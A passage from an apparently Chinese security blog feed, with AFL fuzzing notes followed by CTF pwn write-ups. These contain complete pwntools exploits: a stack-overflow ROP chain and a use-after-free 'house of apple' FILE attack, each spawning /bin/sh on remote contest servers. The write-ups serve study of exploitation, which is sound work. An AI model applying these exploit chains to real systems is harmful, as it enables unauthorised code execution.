<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Main entry point. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">/* Example-only buffer, you&#x27;d replace it with other global or</span></span><br><span class="line"><span class="comment">                    local variables appropriate for your use case. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (__AFL_LOOP(<span class="number">1000</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*** PLACEHOLDER CODE ***/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* STEP 1: 初始化所有变量 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* STEP 2: 读取输入数据，从文件读入时需要先关闭旧的fd然后重新打开文件*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* STEP 3: 调用待fuzz的code*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">0</span>] == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;one\n&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (buf[<span class="number">1</span>] == <span class="string">&#x27;o&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;two\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (buf[<span class="number">2</span>] == <span class="string">&#x27;o&#x27;</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;three\n&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (buf[<span class="number">3</span>] == <span class="string">&#x27;!&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;four\n&quot;</span>);</span><br><span class="line">            <span class="built_in">abort</span>();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*** END PLACEHOLDER CODE ***/</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 循环结束，正常结束。AFL会重启进程，并清理内存、剩余fd等 */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要的逻辑</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* A simplified persistent mode handler, used as explained in README.llvm. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __afl_persistent_loop(<span class="type">unsigned</span> <span class="type">int</span> max_cnt) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8  first_pass = <span class="number">1</span>;</span><br><span class="line">  <span class="type">static</span> u32 cycle_cnt;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (first_pass) &#123;   <span class="comment">// 第一次pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Make sure that every iteration of __AFL_LOOP() starts with a clean slate.</span></span><br><span class="line"><span class="comment">       On subsequent calls, the parent will take care of that, but on the first</span></span><br><span class="line"><span class="comment">       iteration, it&#x27;s our job to erase any trace of whatever happened</span></span><br><span class="line"><span class="comment">       before the loop. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_persistent) &#123;   <span class="comment">// 持续</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">memset</span>(__afl_area_ptr, <span class="number">0</span>, MAP_SIZE);</span><br><span class="line">      __afl_area_ptr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">      __afl_prev_loc = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cycle_cnt  = max_cnt;</span><br><span class="line">    first_pass = <span class="number">0</span>;   <span class="comment">// 设置为0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 不是第一次pass</span></span><br><span class="line">  <span class="keyword">if</span> (is_persistent) &#123;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (--cycle_cnt) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">raise</span>(SIGSTOP);   <span class="comment">// 让当前进程暂停</span></span><br><span class="line"></span><br><span class="line">      __afl_area_ptr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">      __afl_prev_loc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;   <span class="comment">// cycle_cnt 结束</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When exiting __AFL_LOOP(), make sure that the subsequent code that</span></span><br><span class="line"><span class="comment">         follows the loop is not traced. We do that by pivoting back to the</span></span><br><span class="line"><span class="comment">         dummy output region. */</span></span><br><span class="line"></span><br><span class="line">      __afl_area_ptr = __afl_area_initial;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逻辑</p>
<ul>
<li>第一次执行loop循环，进行初始化，然后返回1。</li>
<li>执行一次fuzz，计数器cnt减1，抛出SIGSTOP信号暂停子进程；</li>
<li>其余执行loop循环，恢复之前暂停的子进程继续执行（forkserver），并设置 <code>child_stopped</code> 为0。此时相当于重新执行了一次程序，重新对 <code>__afl_prev_loc</code> 进行设置，随后返回1，再次进入 <code>while(_AFL_LOOP(1000))</code> ，执行一次fuzz，计数器cnt减1，抛出SIGSTOP信号暂停子进程；</li>
<li>第1000次执行，计数器cnt此时为0，不再暂停子进程，令 <code>__afl_area_ptr</code> 指向无关数组 <code>__afl_area_initial</code> ，随后子进程结束。</li>
</ul>
<h5 id="trace-pc"><a href="#trace-pc" class="headerlink" title="trace-pc"></a>trace-pc</h5><p>该模式需要先构建 <code>afl-clang-fast</code> 时指定 <code>AFL_TRACE_PC=1</code>，在使用 <code>afl-clang-fast</code> 时加上 <code>fsanitize-coverage=trace-pc-guard</code> 参数来开启该功能。这种模式下的插桩，会在每个 edge 处都进行插桩，而不再是基本块。</p>
<h3 id="afl-clang-lto"><a href="#afl-clang-lto" class="headerlink" title="afl-clang-lto"></a>afl-clang-lto</h3><p>aflplusplus</p>
<p>LTO（Link Time Optimization）链接时优化是链接期间的程序优化，多个中间文件通过链接器合并在一起，并将它们组合为一个程序，缩减代码体积，因此链接时优化是对整个程序的分析和跨模块的优化。</p>
<p>源码安装<code>afl-clang-lto</code>，需要安装 <code>llvm</code> 和 <code>lld</code> （version &gt;&#x3D; 11)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install llvm lld</span><br></pre></td></tr></table></figure>

<p>然后根据<a href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.lto.md">AFLplusplus&#x2F;instrumentation&#x2F;README.lto.md</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 需要注意这个版本，需要先查看一下</span></span><br><span class="line">$ <span class="built_in">export</span> LLVM_CONFIG=llvm-config-16</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure>

<p>源码：todo</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://www.v4ler1an.com/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/#1-deferred-instrumentation">AFL二三事</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>Fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>ichunqiu冬季赛</title>
    <url>/2024/01/28/ichunqiu%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
    <content><![CDATA[<blockquote>
<p>春秋杯 冬季赛</p>
</blockquote>
<span id="more"></span>
<h2 id="nmanager"><a href="#nmanager" class="headerlink" title="nmanager"></a>nmanager</h2><ol>
<li>随机数比较，但是1s 相对程序来说很撑，因此可以得到其seed</li>
<li>数组越界导致的栈溢出，往栈上写内容。</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">modify</span><span class="params">(<span class="type">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;## select the idx you want modify ##&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gender: &quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;a1[<span class="number">120</span> * n], <span class="number">32uLL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;age: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;a1[<span class="number">120</span> * n + <span class="number">32</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;name: &quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;a1[<span class="number">120</span> * n + <span class="number">40</span>], <span class="number">64uLL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;[idx%d]:\nname: %s\nage: %lld\ngender: %s\n&quot;</span>,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)n,</span><br><span class="line">      &amp;a1[<span class="number">120</span> * n + <span class="number">40</span>],</span><br><span class="line">      *(_QWORD *)&amp;a1[<span class="number">120</span> * n + <span class="number">32</span>],</span><br><span class="line">      &amp;a1[<span class="number">120</span> * n]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;quit now?(Y/y)&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">3uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( buf[<span class="number">0</span>] != <span class="string">&#x27;y&#x27;</span> &amp;&amp; buf[<span class="number">0</span>] != <span class="string">&#x27;Y&#x27;</span> );</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp如下</p>
<ul>
<li>栈上有个got表，本来是想泄露这个，但是在栈上的位置会变。后来直接泄露返回地址了。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p, cmd=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    gdb.attach(p, cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;nmanager_patched&quot;</span></span><br><span class="line">clib = CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"><span class="comment"># context.timeout = 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line">ip, port = <span class="string">&quot;39.106.48.123&quot;</span>, <span class="number">43714</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line">seed = clib.time(<span class="number">0</span>)</span><br><span class="line">clib.srand(seed)</span><br><span class="line">table = <span class="built_in">list</span>(<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>)</span><br><span class="line">num = clib.rand() % <span class="number">62</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;input password: &quot;</span>, table[num].encode())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;## select the idx you want modify&quot;</span>, <span class="string">b&quot;8&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;gender:&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;age: &quot;</span>, <span class="string">b&quot;+&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;name: &quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x8</span>)</span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc.address = leak - <span class="number">0x29d90</span></span><br><span class="line"><span class="keyword">assert</span>(libc.address &amp; <span class="number">0xfff</span> == <span class="number">0</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc =&gt; %#x&quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;quit now?(Y/y)&quot;</span>, <span class="string">b&quot;n&quot;</span>)</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi; ret&quot;</span>)).__next__()</span><br><span class="line">bin_sh = libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">system = libc.sym.system</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">og = libc.address + <span class="number">0xebcf8</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;## select the idx you want modify&quot;</span>, <span class="string">b&quot;8&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0xdeadbeef</span>) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh)</span><br><span class="line">p.sendafter(<span class="string">b&quot;gender:&quot;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;age: &quot;</span>, <span class="built_in">str</span>(system))</span><br><span class="line">p.sendafter(<span class="string">b&quot;name: &quot;</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;quit now?(Y/y)&quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="book"><a href="#book" class="headerlink" title="book"></a>book</h2><p>UAF libc2.35，并且还没有沙箱，直接使用 <code>house of apple</code></p>
<ul>
<li>还可以劫持的 <code>tls_dtor_list</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/<span class="function">python3</span></span><br><span class="line"><span class="function">from pwn <span class="keyword">import</span> *</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">s</span><span class="params">(data)</span>:</span></span><br><span class="line"><span class="function">    return p.send(data)</span></span><br><span class="line"><span class="function">def sa(delim, data):</span></span><br><span class="line"><span class="function">    return p.sendafter(delim, data)</span></span><br><span class="line"><span class="function">def sl(data):</span></span><br><span class="line"><span class="function">    return p.sendline(data)</span></span><br><span class="line"><span class="function">def sla(delim, data):</span></span><br><span class="line"><span class="function">    return p.sendlineafter(delim, data)</span></span><br><span class="line"><span class="function">def r(num=</span><span class="number">4096</span>):</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">recv</span>(num)</span><br><span class="line">def <span class="built_in">ru</span>(delim, drop=False):</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">recvuntil</span>(delim, drop)</span><br><span class="line">def <span class="built_in">rl</span>():</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">recvline</span>(timeout=<span class="number">1</span>)</span><br><span class="line">def <span class="built_in">itr</span>():</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">interactive</span>()</span><br><span class="line">def <span class="built_in">lg</span>(name):</span><br><span class="line">    <span class="keyword">return</span> log.<span class="built_in">success</span>(<span class="string">&quot;\033[32m%s ==&gt; 0x%x\033[0m&quot;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line">def <span class="built_in">uu64</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">u64</span>(p.<span class="built_in">recvuntil</span>(b<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">def <span class="built_in">uu32</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">u32</span>(p.<span class="built_in">recvuntil</span>(b<span class="string">&quot;\xf7&quot;</span>)[<span class="number">-4</span>:].<span class="built_in">ljust</span>(<span class="number">4</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">def <span class="built_in">itob</span>(num):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(num).<span class="built_in">encode</span>()</span><br><span class="line">def <span class="built_in">dbg</span>(p, cmd=<span class="string">&quot;&quot;</span>):</span><br><span class="line">    gdb.<span class="built_in">attach</span>(p, cmd)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">menu</span>(c):</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;&gt; &quot;</span>, <span class="built_in">itob</span>(c))</span><br><span class="line">def <span class="built_in">new</span>(idx, sz):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;what size :&quot;</span>, <span class="built_in">itob</span>(sz))</span><br><span class="line">def <span class="built_in">delete</span>(idx):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">def <span class="built_in">show</span>(idx):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">def <span class="built_in">edit</span>(idx, con):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;content: &quot;</span>, con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = <span class="built_in">ELF</span>(file, checksec=False)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&quot;INFO&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = elf.<span class="built_in">process</span>()</span><br><span class="line">ip, port = <span class="string">&quot;8.147.135.190&quot;</span>, <span class="number">24343</span></span><br><span class="line">p = <span class="built_in">remote</span>(ip, port)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">10</span>, <span class="number">0x38</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">0</span>, <span class="number">0x428</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">1</span>, <span class="number">0x28</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">2</span>, <span class="number">0x418</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">4</span>, <span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">show</span>(<span class="number">0</span>)</span><br><span class="line">leak = <span class="built_in">uu64</span>()</span><br><span class="line"></span><br><span class="line">libc.address = leak - <span class="number">0x219ce0</span></span><br><span class="line">system = libc.sym.system</span><br><span class="line">bin_sh = libc.<span class="built_in">search</span>(b<span class="string">&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">IO_list_all = libc.sym._IO_list_all</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">show</span>(<span class="number">1</span>)</span><br><span class="line">heap_base = <span class="built_in">u64</span>(<span class="built_in">r</span>(<span class="number">5</span>).<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">new</span>(<span class="number">11</span>, <span class="number">0x438</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">2</span>)</span><br><span class="line">payload = <span class="built_in">flat</span>(&#123;</span><br><span class="line">    <span class="number">0x18</span>: IO_list_all - <span class="number">0x20</span></span><br><span class="line">&#125;, filler = b<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">0</span>, payload)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">12</span>, <span class="number">0x438</span>)  # IO_list_all =&gt; chunk <span class="number">2</span></span><br><span class="line"></span><br><span class="line"># <span class="meta"># house of apple v2，change _IO_list_all</span></span><br><span class="line">fs = <span class="built_in">FileStructure</span>()</span><br><span class="line">fs.vtable = libc.sym._IO_wfile_jumps</span><br><span class="line">fs._IO_write_base = <span class="number">0</span></span><br><span class="line">fs._IO_write_ptr = <span class="number">1</span></span><br><span class="line">fs.chain = <span class="number">0</span></span><br><span class="line">fs._wide_data = heap_base + <span class="number">0xb80</span>  # chunk4</span><br><span class="line">payload = <span class="built_in">bytes</span>(fs)[<span class="number">0x10</span>:]</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">wdata = <span class="built_in">fit</span>(&#123;</span><br><span class="line">    <span class="number">0xe0</span><span class="number">-0x10</span>: heap_base + <span class="number">0xb80</span> + <span class="number">0xe0</span> + <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xe0</span>: &#123;</span><br><span class="line">        <span class="number">0x68</span>: libc.sym.system</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=b<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">4</span>, wdata)</span><br><span class="line"># _IO_wfile_overflow</span><br><span class="line"></span><br><span class="line"><span class="built_in">lg</span>(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line"><span class="built_in">lg</span>(<span class="string">&quot;libc.address&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">edit</span>(<span class="number">1</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x20</span> + b<span class="string">&quot;     sh;&quot;</span>)</span><br><span class="line"><span class="built_in">menu</span>(<span class="number">5</span>)</span><br><span class="line"><span class="meta"># dbg(p)</span></span><br><span class="line"><span class="built_in">itr</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="HouseofSome"><a href="#HouseofSome" class="headerlink" title="HouseofSome"></a>HouseofSome</h2><p>给出glibc2.38 patch文件：patch了 <code>_IO_wide_data</code> 的 <strong>虚表检查</strong>，常见的 house of 技术无法使用</p>
<figure class="highlight patch"><table><tr><td class="code"><pre><span class="line"><span class="comment">diff --git a/libio/libioP.h b/libio/libioP.h</span></span><br><span class="line"><span class="comment">index 745278e..b3858d1 100644</span></span><br><span class="line"><span class="comment">--- a/libio/libioP.h</span></span><br><span class="line"><span class="comment">+++ b/libio/libioP.h</span></span><br><span class="line"><span class="meta">@@ -100,7 +100,7 @@</span></span><br><span class="line"> #define _IO_JUMPS_FILE_plus(THIS) \</span><br><span class="line">   _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span><br><span class="line"> #define _IO_WIDE_JUMPS(THIS) \</span><br><span class="line"><span class="deletion">-  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br><span class="line"><span class="addition">+  (IO_validate_vtable(_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable))</span></span><br><span class="line"> #define _IO_CHECK_WIDE(THIS) \</span><br><span class="line">   (_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data) != NULL)</span><br></pre></td></tr></table></figure>

<p>程序不需要自己patch，指定了runpath</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc -Wl,-R/path/to/library xxx.c                   <span class="comment"># 指定libc</span></span><br><span class="line">$ <span class="built_in">export</span> LD_RUN_PATH=/path/to/library  <span class="comment"># 或者</span></span><br><span class="line">$ ldd houseofsome</span><br><span class="line">	linux-vdso.so.1 (0x00007ffcca981000)</span><br><span class="line">	libc.so.6 =&gt; ./libc.so.6 (0x00007fbff2200000)</span><br><span class="line">	./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007fbff24e6000)</span><br></pre></td></tr></table></figure>

<p>mmap 了一段可读可写的内存</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="number">0x114514000</span>        <span class="number">0x114515000</span> rw-p     <span class="number">1000</span>      <span class="number">0</span> [anon_114514] </span><br></pre></td></tr></table></figure>

<p>draw 时，因为没有判断offset的值，存在溢出问题</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">draw</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 offset; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !magic</span><br><span class="line">    &amp;&amp; dev</span><br><span class="line">    &amp;&amp; name</span><br><span class="line">    &amp;&amp; (<span class="built_in">printf</span>(<span class="string">&quot;offset&gt; &quot;</span>), offset = <span class="built_in">getint</span>(), <span class="built_in">printf</span>(<span class="string">&quot;length&gt; &quot;</span>), (<span class="type">unsigned</span> __int64)<span class="built_in">getint</span>() &lt;= <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fread</span>((<span class="type">void</span> *)(offset + <span class="number">0x114514000</span>LL), <span class="number">1uLL</span>, <span class="number">1uLL</span>, dev);</span><br><span class="line">    magic = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>记一下知识点：</p>
<ul>
<li>fopen函数会malloc一个堆块作为<code>_IO_FILE</code>管理结构，并头插进入<code>_IO_list_all</code>，使得libc内会存放一个堆地址</li>
<li>scanf 在输入 <code>+/-</code> 字符时，占位但是不覆盖，造成泄露栈</li>
</ul>
